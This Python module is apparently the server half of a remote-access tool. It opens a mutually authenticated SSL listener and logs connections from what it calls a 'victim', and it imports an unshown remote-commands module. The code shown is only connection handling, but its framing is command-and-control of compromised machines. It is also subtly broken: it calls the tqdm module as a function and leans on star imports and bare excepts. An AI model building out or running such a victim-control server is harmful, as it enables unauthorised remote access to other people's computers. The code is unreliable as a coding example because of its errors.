import tqdm
from time import sleep
from colorama import Fore
from serverSSLconnection import *
from serverSSLRemoteCommands import *
from serverSSLgeneral import *

from socket import *

#openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt

IP = "localhost"
PORT = 12000
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"

server_cert = 'server.crt'
server_key = 'server.key'
client_certs = 'client.crt'


#Controllo certificato di connessione
def controlConnection():
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_cert_chain(certfile=server_cert, keyfile=server_key)
    context.load_verify_locations(cafile=client_certs)
    return context


#Attivazione server
def serverConnections():
    try:
        context=controlConnection()
        server = socket(AF_INET, SOCK_STREAM)
        server.bind(ADDR)
        server.listen(1)
        print()
        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Starting the server...", colour="green",
                      ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
            sleep(0.2)
        print(f"[LISTENING] The Sever is waiting for a victim...\n")

        return server, context

    except:
        print(f"[ERROR] Unable to start the Server...\n")
        return "errore",0


#Accettazione client
def manageConnection(fileLog, server, context):

    try:
        newsocket, fromaddr = server.accept()
        print("Client connected: {}:{}".format(fromaddr[0], fromaddr[1]))
        fileLog = fileLog + "\nClient connected: {}:{}".format(fromaddr[0], fromaddr[1])
        conn = context.wrap_socket(newsocket, server_side=True)
        print("[SSL established] Peer: {}".format(conn.getpeercert()))
        fileLog = fileLog + "\n[SSL established] Peer: {}".format(conn.getpeercert())
        print(f"[CONNECTED] Established a connection with the Victim using socket: {fromaddr}")
        fileLog = fileLog + f"\n[CONNECTED] Established a connection with the Victim using socket: {fromaddr}"

        return fileLog, conn, fromaddr

    except:
        print(f"\n[ERROR] Connection refused!")
        fileLog = fileLog + f"\n[ERROR] Connection refused!"
        return fileLog, 0, 0
    #print("Closing connection")
    #conn.shutdown(socket.SHUT_RDWR)
    #conn.close()



# OK crea connessione
def serverConnection():
    IP = "localhost"
    PORT = 12000
    ADDR = (IP, PORT)
    SIZE = 4096
    FORMAT = "utf-8"

    try:
        server = socket(AF_INET, SOCK_STREAM)
        server.bind(ADDR)
        server.listen(1)
        print()
        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Starting the server...", colour="green", ncols=65,
                      bar_format="{desc}: {percentage:3.0f}% {bar}"):
            sleep(0.2)
        print(f"[LISTENING] The Sever is waiting for a victim...\n")
        return server
    except:
        #traceback.print_exc()
        print(f"[ERROR] Unable to start the Server...\n")
        return "errore"

